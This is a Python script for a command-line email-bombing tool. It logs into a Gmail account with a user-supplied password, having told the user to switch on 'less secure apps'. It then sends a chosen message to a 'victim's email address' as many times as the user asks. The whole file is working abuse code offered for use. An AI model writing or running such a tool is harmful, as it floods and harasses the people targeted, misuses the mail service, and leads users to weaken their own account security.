#Coded by Balta

import os
import sys
import time
import smtplib
from tqdm import tqdm
from colorama import Fore

if len(sys.argv) < 2:
    os.system("clear || cls")
    print("")
    
    loop = tqdm(total=10000, position=0, leave=False)
    for k in range(10000):
        loop.set_description(Fore.LIGHTRED_EX + 'Opening Script'.format(k))
        loop.update(1)
    loop.close()
    
    sys.stdout.write(f'''                                         
{Fore.LIGHTMAGENTA_EX}   ____           _ __    ____                    ___ {Fore.RESET}
{Fore.LIGHTBLUE_EX}  / __/_ _  ___ _(_) /___/ __/__  ___ ___ _  ____/ _ ){Fore.RESET}
{Fore.LIGHTCYAN_EX} / _//  ' \/ _ `/ / /___/\ \/ _ \/ _ `/  ' \/___/ _  |{Fore.RESET}
{Fore.LIGHTRED_EX}/___/_/_/_/\_,_/_/_/   /___/ .__/\_,_/_/_/_/   /____/ {Fore.RESET}
{Fore.LIGHTGREEN_EX}Author: Balta             {Fore.LIGHTRED_EX}/_/{Fore.RESET}{Fore.LIGHTGREEN_EX} v1.0                    {Fore.RESET}           

[{Fore.RED}!{Fore.RESET}] {Fore.LIGHTGREEN_EX}Make sure your gmail has less secure apps on (https://myaccount.google.com/lesssecureapps)
    ''' + Fore.RESET)

print("")

spamemail = input(f"[{Fore.LIGHTRED_EX}?{Fore.RESET}]{Fore.LIGHTGREEN_EX} Enter spammer's gmail address: {Fore.RESET}")
spampassword = input(f"[{Fore.LIGHTRED_EX}?{Fore.RESET}]{Fore.LIGHTGREEN_EX} Enter spammer's password: {Fore.RESET}")

email = smtplib.SMTP("smtp.gmail.com", 587)
email.ehlo()
email.starttls()

try:
    email.login(spamemail, spampassword)
except smtplib.SMTPAuthenticationError:
    print("")
    print(f"[{Fore.LIGHTRED_EX}!{Fore.RESET}] {Fore.LIGHTGREEN_EX}The gmail or password might be wrong{Fore.RESET}")
    print(
f"[{Fore.LIGHTRED_EX}!{Fore.RESET}]{Fore.LIGHTGREEN_EX} OR You maybe haven't switched on less secure apps (https://myaccount.google.com/lesssecureapps){Fore.RESET}")
    print(f"{Fore.RESET}[{Fore.LIGHTRED_EX}!{Fore.RESET}]{Fore.LIGHTGREEN_EX} Closing in 5 seconds...{Fore.RESET}")
    time.sleep(5)
    exit()

print("")
print(
f"[{Fore.LIGHTRED_EX}!{Fore.RESET}] {Fore.LIGHTGREEN_EX}Gmail and password is correct, less secure apps is enabled{Fore.RESET}")
print("")
victimemail = input(
f"{Fore.RESET}[{Fore.LIGHTRED_EX}?{Fore.RESET}] {Fore.LIGHTGREEN_EX}Enter victim's email address: {Fore.RESET}")
message = input(f"[{Fore.LIGHTRED_EX}?{Fore.RESET}] {Fore.LIGHTGREEN_EX}Enter the message you want to send: {Fore.RESET}")
number = int(input(
f"[{Fore.LIGHTRED_EX}?{Fore.RESET}] {Fore.LIGHTGREEN_EX}Enter how many times you want to send this message: {Fore.RESET}"))

print("")
print(f"[{Fore.LIGHTRED_EX}!{Fore.RESET}]{Fore.LIGHTGREEN_EX} Information is correct!{Fore.RESET}")
print("")

try:
    smtp_server = 'smtp.gmail.com'
    port = 587
    server = smtplib.SMTP(smtp_server, port)
    server.ehlo()
    if smtp_server == "smtp.gmail.com":
        server.starttls()
    server.login(spamemail, spampassword)
    i = 0
    print(f"[{Fore.LIGHTRED_EX}!{Fore.RESET}]{Fore.LIGHTGREEN_EX} Rolling spliff... {Fore.RESET}")
    print('')
    while i < number:
        i += 1
        server.sendmail(spamemail, victimemail, message)
        if i == 1:
            print((f'[{Fore.LIGHTRED_EX}+{Fore.RESET}] {Fore.LIGHTGREEN_EX}''[%d] Email sent ') % (i))
        elif i == 2:
            print((f'{Fore.RESET}[{Fore.LIGHTRED_EX}+{Fore.RESET}] {Fore.LIGHTGREEN_EX}''[%d] Email sent ') % (i))
        elif i == 3:
            print((f'{Fore.RESET}[{Fore.LIGHTRED_EX}+{Fore.RESET}] {Fore.LIGHTGREEN_EX}''[%d] Email sent ') % (i))
        elif i == 4:
            print((f'{Fore.RESET}[{Fore.LIGHTRED_EX}+{Fore.RESET}] {Fore.LIGHTGREEN_EX}''[%d] Email sent ') % (i))
        elif i == 5:
            print((f'{Fore.RESET}[{Fore.LIGHTRED_EX}+{Fore.RESET}] {Fore.LIGHTGREEN_EX}''[%d] Email sent ') % (i))
        elif i == 6:
            print((f'{Fore.RESET}[{Fore.LIGHTRED_EX}+{Fore.RESET}] {Fore.LIGHTGREEN_EX}''[%d] Email sent ') % (i))
        elif i == 7:
            print((f'{Fore.RESET}[{Fore.LIGHTRED_EX}+{Fore.RESET}] {Fore.LIGHTGREEN_EX}''[%d] Email sent ') % (i))
        elif i == 8:
            print((f'{Fore.RESET}[{Fore.LIGHTRED_EX}+{Fore.RESET}] {Fore.LIGHTGREEN_EX}''[%d] Email sent ') % (i))
        elif i == 9:
            print((f'{Fore.RESET}[{Fore.LIGHTRED_EX}+{Fore.RESET}] {Fore.LIGHTGREEN_EX}''[%d] Email sent ') % (i))
        elif i == 0:
            print((f'{Fore.RESET}[{Fore.LIGHTRED_EX}+{Fore.RESET}] {Fore.LIGHTGREEN_EX}''[%d] Email sent ') % (i))
        else:
            print((f'{Fore.RESET}[{Fore.LIGHTRED_EX}+{Fore.RESET}] {Fore.LIGHTGREEN_EX}''[%d] Email sent ') % (i))
        sys.stdout.flush()
    print()
    print(f"{Fore.RESET}[{Fore.LIGHTRED_EX}!{Fore.RESET}] {Fore.LIGHTGREEN_EX} The email has been put in a spliff")
    print()
    loop = tqdm(total=40000, position=0, leave=False)
    for k in range(40000):
        loop.set_description(Fore.YELLOW + 'Closing'.format(k))
        loop.update(1)
    loop.close()
    exit()

except KeyboardInterrupt:
    print()
    print(f"[{Fore.LIGHTRED_EX}!{Fore.RESET}]{Fore.LIGHTGREEN_EX} The email has not been put in a spliff")
    loop = tqdm(total=40000, position=0, leave=False)
    for k in range(40000):
        loop.set_description(Fore.YELLOW + 'Closing'.format(k))
        loop.update(1)
    loop.close()
    exit()
